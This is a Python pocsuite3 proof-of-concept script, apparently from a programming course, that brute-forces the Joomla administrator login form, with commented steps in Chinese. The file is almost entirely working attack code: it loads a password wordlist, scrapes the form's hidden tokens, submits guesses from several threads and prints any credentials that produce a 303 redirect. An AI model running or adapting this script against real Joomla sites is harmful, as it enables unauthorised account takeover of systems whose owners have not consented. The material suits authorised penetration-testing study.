#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/27 17:58 
# @Author   : ordar
# @File     : joomla_form_brute.py  
# @Project  : pythonCourse
# @Python   : 3.7.5
import queue
import threading
from collections import OrderedDict

from bs4 import BeautifulSoup
from pocsuite3.api import Output, POCBase, register_poc, requests
from pocsuite3.lib.core.interpreter_option import OptString


class DemoPOC(POCBase):
    vulID = ''  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    author = 'ordar'  # PoC作者的大名
    vulDate = '2020-11-27'  # 漏洞公开的时间,不知道就写今天
    createDate = '2020-11-27'  # 编写 PoC 的日期
    updateDate = '2020-11-27'  # PoC 更新的时间,默认和编写时间一样
    references = []  # 漏洞地址来源,0day不用写
    name = 'joomla form brute poc'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'joomla'  # 漏洞应用名称
    appVersion = 'all'  # 漏洞影响版本
    vulType = 'form brute'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        joomla登录表单暴力破解
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' -u：指定username -P：指定password字典'''

    # 编写自定义参数
    def _options(self):
        """
        需要实现自定义参数，-u和-P，分别用来加载username和password字典
        小写u指定用户名，大小P指定password字典
        :return:
        """
        # 实现一个OrderedDict对象，必须为这个对象，并且必须返回
        o = OrderedDict()
        # 加参数就跟使用字典一样的,require=True表示这两个参数必须输入
        o["u"] = OptString('', description="用户名", require=True)
        o['P'] = OptString('', description="密码字典路径", require=True)
        return o

    # 可以添加我们的自己定义的变量和自己定义的函数
    # 把我们之前的joomla表单爆破脚本稍微修改一下
    user_thread = 5
    resume = None
    # 对应的HTML元素
    usernmae_field = "username"
    password_field = "passwd"
    # 设置目标地址,要解析HTML的页面和要尝试暴力破解的位置。
    # target_index_url = "http://localhost/joomla/administrator/index.php"
    # target_post_url = "http://localhost/joomla/administrator/index.php"
    # 检测每一次暴力破解提交的用户名和密码是否登录成功
    # 如果响应码为303代表密码正确
    success_check = 303
    found = False

    # 构建字典队列。
    def build_wordlist(self, wordlist_file):
        """
        读入一个字典文件，然后开始对文件中的每一行进行迭代。
        如果网络连接突然断开或者目标网站中断运行，则我们设置的一些内置函数可以让我们恢复暴力破解会话。
        这可以通过让resume变量接上中断前最后一个尝试暴力破解的路径来轻松实现。
        整个字典文件探测完毕后，返回一个带有全部字符的Queue对象，将在实际的暴力破解函数中使用。
        :param wordlist_file:字典文件
        :return:返回一个带有全部字符的Queue对象
        """
        # 读入字典文件
        with open(wordlist_file, 'r') as f:
            raw_words = f.readlines()
        found_resume = False
        words = queue.Queue()
        # 对字典每一行进行迭代
        for word in raw_words:
            word = word.strip()
            # 判断断点：
            # 如果断点存在就从断点后面开始构建字典队列
            if self.resume is not None:
                if found_resume:
                    words.put(word)
                else:
                    if word == self.resume:
                        found_resume = True
                        print("Resuming wordlist from: {}".format(self.resume))
            else:
                # 没有断点从一开始就构建字典队列
                words.put(word)
        return words

    def web_brute(self, username, password_queue):
        while not password_queue.empty() and not self.found:
            password = password_queue.get().strip()

            resp = requests.get(self.url)
            cookies = resp.cookies.get_dict()
            text = resp.text
            # post提交的表单数据
            all_post_data = {}
            all_post_data[self.usernmae_field] = username
            all_post_data[self.password_field] = password
            # print("[-] Trying: {}:{}".format(username, password))
            # 使用BeautifulSoup解析html，取出所有的input。然后遍历，取出name和value,再追加到all_post_data里面
            soup = BeautifulSoup(text, "xml")
            all_input = soup.find_all("input")
            for i in all_input:
                # print(i, i['name'])
                if i['name'] != self.usernmae_field and i['name'] != self.password_field:
                    # print(i['name'], i['value'])
                    all_post_data[i['name']] = i['value']

            # 提交post表单，data是表单，cookies是携带的cookie，
            # allow_redirects禁止重定向
            resp_post = requests.post(self.url, data=all_post_data, cookies=cookies, allow_redirects=False)
            if self.success_check == resp_post.status_code:
                self.found = True
                print("[*] Brute successful.")
                print('[*] Username:{}'.format(username))
                print('[*] Passwd:{}'.format(password))

    def run_brute(self, username, password_queue):
        for i in range(self.user_thread):
            t = threading.Thread(target=self.web_brute, args=(username, password_queue))
            t.start()

    # 编写验证模式
    def _verify(self):
        """
        验证模式：这里就写验证代码
        :return:
        """
        # 获取自定义参数。使用self.get_option方法获取我们设置的参数，得到用户名字典和密码字典
        username = self.get_option('u')
        password_file = self.get_option('P')
        password_queue = self.build_wordlist(password_file)
        self.run_brute(username, password_queue)

    # 编写攻击模式
    def _attack(self):
        self._verify()

    # 编写shell模式
    def _shel(self):
        self._verify()

    # 解析输出函数
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
